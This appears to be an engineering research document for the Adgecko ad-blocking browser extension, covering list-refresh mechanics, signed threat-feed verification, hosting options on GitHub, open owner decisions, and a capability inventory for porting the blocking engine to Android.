| Repository: today's list refresh | Each Chrome copy downloads 8 lists and parses them itself. The alarm runs every 180 minutes. An automatic run occurs only 12 hours after the last good run. The packed snapshot has 195,069 whole domains, 18,422 scoped entries and 15,865 threat hosts (packed 2026-11-14T22:00:32Z). No workflow runs the packer today. The packer runs on the owner's PC. | checked | high | 2026-11-17, commit 0e8dd60 | .planning/codebase/INTEGRATIONS.md sections 2, 3 and 8 (read 2026-11-17)<br>src/rules/meta.json (read 2026-11-17)<br>.github/workflows/*.yml (read 2026-11-17) |
| Size of a compiled DNS list (measured) | I extracted the block hosts from the packed rules into the scratchpad. general-network.json has 197,343 whole-domain block hosts. 14,475 of the 15,865 threat hosts are already in that set. The union has 198,733 hosts: 4.18 MB plain text, 1.51 MB with gzip. A threat-only feed.json in format 1 (199 entries, 80 hosts per entry) has 333,426 bytes. This is less than the 512 KB feed limit. The full DNS list cannot go in feed.json. Rules with initiatorDomains or main_frame-only conditions are not DNS-safe, and I left them out (1,584 hosts). | checked | high | 2026-11-17 | Local computation on src/rules/general-network.json and threat-network.json, output in (a scratch file of the research session) |
| What src/feed/ verifies | Order: byte checks (512 KB maximum, no BOM, valid UTF-8). Then the signature file (1,024 bytes maximum, exactly two lines: keyId=<id> and a base64 64-byte signature). Then a lookup of the pinned key (base64 of a 32-byte raw Ed25519 key). Then a WebCrypto Ed25519 check over the exact bytes. JSON.parse runs only after that. Then a strict schema, format 1: an unknown key rejects the document. dnr has 4,500 entries maximum and 1 to 80 hosts for each entry. notAfter is 14 days maximum after createdAt. The clock difference limit is 1 hour. The serial must increase, with a maximum of 2,147,483,647 and a maximum step of 1,000,000. A protected stream host rejects the full document. A feed key cannot sign a kill document. A kill key can sign only the kill document. The client also has a kill latch, a soft kill, a rollback and a cache of two files. The rules are block-only, with priority 2,000,010 and ids 700001 to 704500. | checked | high | 2026-11-17 | src/feed/canonical.js, verify.js, schema.js, compile.js (read 2026-11-17)<br>docs/feed-setup.md (read 2026-11-17) |
| Feed client host constraints (affects D-1) | configured() needs FEED_ORIGIN to be a bare https origin (u.origin === FEED_ORIGIN). FEED_PATH is fixed to /feed.json and SIG_PATH to /feed.json.sig. fetch uses redirect: "error", and the client rejects an answer from another origin. The manifest must contain FEED_ORIGIN + "/*". Thus with no code change, only a GitHub Pages user site (https://<owner>.github.io) or a custom domain can be the feed host. A project Pages site (https://<owner>.github.io/<repo>/) has a path. raw.githubusercontent.com has a path. A release asset redirects (next finding). | checked | high | 2026-11-17 | src/feed/client.js lines 25-40 and 77-86 (read 2026-11-17)<br>src/feed/config.js (read 2026-11-17) |
| GitHub Release assets as a host | A request to github.com/<owner>/<repo>/releases/latest/download/<file> gives a 302 to the tag URL. The tag URL gives a 302 to release-assets.githubusercontent.com. Thus the feed client (redirect: "error") cannot read a release asset. Limits: each file must be under 2 GiB, 1,000 assets maximum for each release, and no limit on total size or bandwidth. | checked | high | 2026-11-17 | curl test on a public release, 2026-11-17<br>https://docs.github.com/en/repositories/releasing-projects-on-github/about-releases (read 2026-11-17) |
| GitHub Pages as a host | Limits: a published site is 1 GB maximum. The soft bandwidth limit is 100 GB each month. The soft build limit is 10 builds each hour, but it does not apply to a custom Actions workflow. A deployment times out after 10 minutes. HTTP 429 rate limits can apply. Pages must not be used as a commercial SaaS. Test of a Pages file (a uBlock filter list that Adgecko already uses): HTTP 200, cache-control max-age=600, access-control-allow-origin *, ETag, and gzip on request (274,891 bytes became 93,725 bytes). Two devices that get 1.5 MB every 12 hours use about 0.2 GB each month. | checked | high | 2026-11-17 | https://docs.github.com/en/pages/getting-started-with-github-pages/github-pages-limits (read 2026-11-17)<br>curl test of https://ublockorigin.github.io/uAssets/filters/badware.txt, 2026-11-17 |
| raw.githubusercontent.com as a host | The GitHub changelog of 2025-05-08 made the rate limits for unauthenticated requests stricter. These requests include downloads from raw.githubusercontent.com. The changelog gives no numbers. A raw URL also has a path, so the feed client cannot use it. | checked | medium | 2026-11-17 | https://github.blog/changelog/2025-05-08-updated-rate-limits-for-unauthenticated-requests/ (read 2026-11-17) |
| GitHub Actions schedule, cost and signing gate | The shortest schedule interval is 5 minutes. At high load, a run can start late or GitHub can drop it. A scheduled run uses only the default branch. In a public repository, GitHub disables scheduled workflows after 60 days with no repository activity. Standard GitHub-hosted runners are free in public repositories. On GitHub Free, a public repository can use environments with required reviewers, wait timers and environment secrets. An optional setting prevents self-review. ### Open questions

- D-1: Which host? A Pages user site (needs a second repository named <owner>.github.io), a project Pages site (needs an approved client and gate change for a path prefix), or a custom domain (needs a domain purchase)?
- D-7: Does CI sign automatically (key in an environment secret, optional required reviewer), or does the owner sign by hand on the PC every 10 to 13 days?
- May a public compiled list include URLhaus-derived hosts under the abuse.ch terms of 2026-10-21? Ask abuse.ch, or drop URLhaus from the public DNS list and keep it only in the extension.
- Peter Lowe terms: the repository says 'non-commercial, credit required'. The page says 'feel free to combine ... and put it up on the web'. Which text is current? Ask the list maintainer, or keep the stricter reading.
- Does the Adgecko phone app filter DNS on the device (no account), or does the owner accept a Cloudflare account and a cloud resolver for less app work?
- Do GitHub-hosted runner IP ranges get HTTP 200 from all 8 list hosts? Run the packer once in a workflow_dispatch job to check.
- On the owner's phone: does Chrome's 'Use secure DNS' show the Custom URL field? Does a custom DoH provider bypass a DNS-only VpnService? Does Android Private DNS interfere with the app's VPN DNS?
- On the owner's PC: which Windows 11 edition? Does Settings show 'On (manual template)' for DoH?
- Does the Cloudflare Zero Trust free plan still exist with Gateway DNS and 50 users, and does the 1,000-entry list limit apply to it? A Cloudflare pricing page did not confirm this.
- Should the Chrome extension later read the compiled output (format 2) and drop 8 of its 9 list host permissions? This is a privacy gain but a large change.

<a id="code-readers"></a>
## Code readers: the Adgecko code for a port

### Worker, list engine, threat tier, feed

Capabilities:

| Id | Name | Chrome APIs | What a host must give | Portable as is | Android risks |
|---|---|---|---|---|---|
| network-list-blocking | Network list blocking (static and dynamic DNR list rules) | declarativeNetRequest static rule_resources (manifest): rulesets general, ubo-youtube, threat; declarativeNetRequest.updateEnabledRulesets: lists switch on/off for ruleset general (enableRuleset, listDeps.setStaticEnabled); declarativeNetRequest.getDynamicRules: read ids before each swap, fallback, applyEnabled; declarativeNetRequest.updateDynamicRules: atomic swap of list rules 100000+ and kept rules 800000+; runtime.getURL + fetch: read packaged general-network.json, dnr-merge-meta.json, packed-cross.json (loadBundled) | A request hook that gives URL, method, resource type, initiator (frame origin) and the frame chain. A rule store with three layers (static rulesets that can be switched on and off, dynamic rules, session rules), ids, an atomic update and a unique-id check (Chrome fails the whole update on a duplicate id). A matcher with priority and the action order allow > allowAllRequests > block at equal priority. It must emulate: requestDomains with subdomains, excludedRequestDomains, initiatorDomains, excludedInitiatorDomains, resourceTypes (omitted = all but main_frame; excluded-only = includes main_frame), excludedResourceTypes, domainType by eTLD+1, requestMethods, excludedRequestMethods, 2 urlFilter rules and 1 regexFilter rule (case-insensitive by default), and allowAllRequests inheritance for YouTube and Kick frames. Volume: 213,508 static plus 229,539 dynamic requestDomains entries (mostly the same hosts), thus a host-suffix hash index is necessary. A serial write queue (dnrExclusive semantics, 120 s backstop). | Checked: filter-options.js and the pure functions of update.js (parseEntriesFull, crossListRules, mergeDomains, mergeScoped, buildListRules, keptBundledRules, isOurRule, isThreatRule) ran unchanged in Deno, in a bare Node vm context and in QuickJS. The rule JSON files are plain data. general-background.js is not portable: it calls chrome.* directly and must be replaced by a host adapter. | Checked: Android WebView shouldInterceptRequest gives only URL, method, headers, isForMainFrame, hasGesture, isRedirect. It gives no resource type and no initiator frame, so the 18,422 scoped entries (16,086 type-only, 2,336 initiator/party/excluded) cannot match exactly. Checked: a host-only (DNS or VPN) blocker can express 195,072 host-only entries exactly, but it also blocks navigation to them, which DNR whole-domain rules do not do (more page breakage). Checked: the stream-site allows (2,000,000) need the frame context. Not checked: Chrome for Android has no extension support. UNVERIFIED: all behaviour on the owner's phone. |
| list-refresh | List refresh (download, parse, check, swap, hide-rule write) | alarms.create / alarms.get / alarms.onAlarm: gecko-refresh (period 180 min, first delay 5 to 30 min random, persistAcrossSessions tried first) and one-shot gecko-refresh-retry (31 min); fetch (global, through listDeps.fetch): HTTPS GET to the 8 list hosts only (isListUrl); storage.local.get / set / remove / getBytesInUse: listState, listData:<name>, cos* keys, generalListStatus, generalListUpdatedAt; runtime.onInstalled: install-time refresh; runtime.onMessage: updateLists, revertLists from the settings page; declarativeNetRequest.* through listDeps for the swap (see network-list-blocking); runtime.getURL + fetch: cosmetic-rules.json, threat-network.json | HTTPS fetch with no redirects (redirect error), no cookies, ETag and If-Modified-Since, a 90 s timeout that includes the body, and a streaming read with a 16 MB cap. The engine needs a Response-like object (ok, status, headers.get, body.getReader or text), TextDecoder, setTimeout and clearTimeout (clearTimeout is called in each case), AbortController (optional). A store for listState (about 2.5 KB) and listData:<name> (7.16 MB in total) and the hide-rule keys (about 1 MB). A scheduler for a 3 h trigger and a 31 min retry; the 12 h and 30 min throttles stay in the engine (shouldRun). The deps contract is the comment above refresh() in update.js: fetch, now, getState, setState, getListData, setListData, removeListData, listDataPresent, getDynamicRules, updateDynamicRules, setStaticEnabled, loadBundled, loadPackedThreatRules, enabled, threatEnabled, cosmeticParse, writeCosmetic, exclusive. | Checked: update.js and cosmetic-parse.js have no chrome.* call and take all I/O through deps. A full fresh-install refresh of the real lists (downloaded 2026-11-17) ran through the repository's fake Chrome worker in Deno: 2,858 list and kept rules, 213,642 domains, 199 threat rules. Checked: in QuickJS the modules load and parse, but a refresh needs polyfills: without URL, isListUrl returns false and each download is refused (fail-closed). | Checked: one full download is 11,227,375 bytes (2026-11-17); the largest list (AdGuard Base) is 4,382,224 bytes. Checked: filters.adtidy.org reset one connection in this session; a retry worked. Checked: parse cost is 409 ms for all 8 lists in Deno, but 1,027 ms for EasyPrivacy alone in QuickJS-WASM (about 11 times slower). Not measured: memory peak and speed on a phone CPU. Not checked: Android background limits (Doze, WorkManager minimum period of 15 min) and metered-network rules. |
| threat-tier | Threat tier (packed and refreshed malware host blocks) | declarativeNetRequest.updateEnabledRulesets: static ruleset threat on/off (setThreatRuleset in syncFromSettings); declarativeNetRequest.getDynamicRules / updateDynamicRules: refreshed threat rules, ids 600000 to 609999 (applyThreatRules, rebuildThreatRules, removeThreatRules); storage.local: listState threat fields (threatRules, threatHosts, threatAcceptedSig, threatHeldAt), settings | A separate block layer at priority 2,000,010: above the stream-site allows (2,000,000) and the YouTube doubleclick block (2,000,001), below Allow this domain (2,000,020) and the list-download allow (3,000,000). Eight resource types: main_frame, sub_frame, script, xmlhttprequest, ping, media, websocket, other (not stylesheet, image, font). Payloads of urlhaus_hosts, ublock_badware and dandelion_antimalware from the list refresh. A per-refresh cap on new hosts (2,500 and 20 %) with a confirm step. An on/off switch (feature threatTier) for the packed and the refreshed set. | Checked: compile.js, protected-hosts.js, psl.js and never-block-captcha.js are pure and ran in Node and QuickJS (compileThreatRules gave 151 rules and 12,024 hosts from the 2026-11-17 Dandelion list). Load order: never-block-captcha.js before protected-hosts.js and update.js (they throw), psl.js before use (else each host is rejected, fail-closed). userDomainReason needs URL only for IDN input. | Checked: all 199 packed threat rules list main_frame, and the rules are host-only, so the tier fits a DNS or VPN blocker well; there it also blocks images, fonts and styles (wider than DNR). Checked: the PSL subset is from 2026-11-15 and has no refresh schedule (CONCERNS M9). A custom matcher must keep the threat layer above the stream-site allows, so that a threat host stays blocked on stream pages. |
| signed-feed | Signed threat feed (dormant) | declarativeNetRequest.getSessionRules / updateSessionRules: feed rules, ids 700001 to 704500, priority 2,000,010 (feedDeps); storage.local: feedState, feedCache (two verified files as base64), feedPaused, settings (snapshotAllowed); runtime.getManifest: version (kill latch, minExtension, maxExtension) and host_permissions (configured() check); runtime.getURL + fetch: threat-snapshot.json; fetch (global): feed origin only, feed.json.sig then feed.json; crypto.subtle importKey/verify Ed25519 (verify.js), digest SHA-256 (client.js); alarms.onAlarm gecko-refresh: checkFeedNow; storage.onChanged feedPaused: applyCachedFeed | Ed25519 verify and SHA-256 (WebCrypto in Chrome and WebView 137+, Firefox 129+, or a Kotlin library), atob, btoa, TextEncoder, TextDecoder with fatal mode, HTTPS fetch with no redirect, a 15 s timeout and a 512 KB streaming cap (signature file 1,024 bytes). A session-rule layer that the app clears at restart and applyCached() fills again (4,500 rules maximum; Chrome session limit 5,000). An app version string. A manifest-like object whose host_permissions holds FEED_ORIGIN + '/*', because configured() requires it. A loader for threat-snapshot.json (199 entries, 15,865 hosts). | Checked: the seven feed files have no chrome.* call; client.js takes all I/O through deps. In Node, verifyFeed accepted a freshly signed document, rejected a tampered signature, checkFeed applied 1 rule, and applyCached with no cache applied the 199 snapshot rules. In QuickJS the files load, but atob, TextDecoder and crypto are missing. | Checked: the feed is dormant: FEED_ORIGIN is an empty string, FEED_KEYS and KILL_KEYS are empty, and the manifest has no feed host; owner decisions D-1 and D-7 are open. Checked: canonical.js uses 'instanceof Uint8Array', which fails for bytes from another realm (seen in a Node vm context), so a bridge must create the bytes in the engine realm. The time checks depend on the phone clock (1 h skew allowed). Not checked: Ed25519 in the Android Java crypto providers for each API level. |
